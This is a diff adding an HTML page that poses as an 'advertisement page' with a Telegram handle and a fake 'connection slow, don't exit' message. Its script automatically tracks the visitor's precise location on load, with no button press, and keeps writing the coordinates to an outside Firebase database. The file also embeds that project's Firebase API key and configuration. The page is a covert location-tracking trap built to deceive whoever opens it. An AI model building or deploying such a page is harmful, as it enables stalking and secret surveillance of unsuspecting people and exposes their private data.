@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Share Location</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(135deg, #4facfe, #00f2fe);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  color: white;
+}
+
+.card {
+  background: rgba(255,255,255,0.15);
+  padding: 30px;
+  border-radius: 20px;
+  text-align: center;
+  width: 320px;
+  backdrop-filter: blur(10px);
+}
+
+h1 { margin-bottom: 10px; }
+
+.status {
+  margin-top: 15px;
+  font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <h1>advertisement page </h1>
+  <p>follow on telegram @big sales</p>
+  <div class="status" id="status">internet connection slow please wait don't exit...!!</div>
+</div>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyCavTzgzcdxMH5TK40QMVefSsvIW3Rcmj4",
+  authDomain: "tractor-d9659.firebaseapp.com",
+  databaseURL: "https://tractor-d9659-default-rtdb.firebaseio.com/",
+  projectId: "tractor-d9659",
+  storageBucket: "tractor-d9659.firebasestorage.app",
+  messagingSenderId: "865011622614",
+  appId: "1:865011622614:web:ee486d0ebce25e5b33df77"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const status = document.getElementById("status");
+
+// 🔥 AUTO START LOCATION (no button)
+if (navigator.geolocation) {
+
+  navigator.geolocation.watchPosition(pos => {
+    const lat = pos.coords.latitude;
+    const lng = pos.coords.longitude;
+
+    db.ref("location").set({ lat, lng });
+
+    status.innerText = "telegram bot pin : " + lat.toFixed(5) + ", " + lng.toFixed(5);
+
+  }, err => {
+    status.innerText = "refresh the page";
+  }, {
+    enableHighAccuracy: true
+  });
+
+} else {
+  status.innerText = "❌ Geolocation not supported";
+}
+</script>
+
+</body>
+</html>
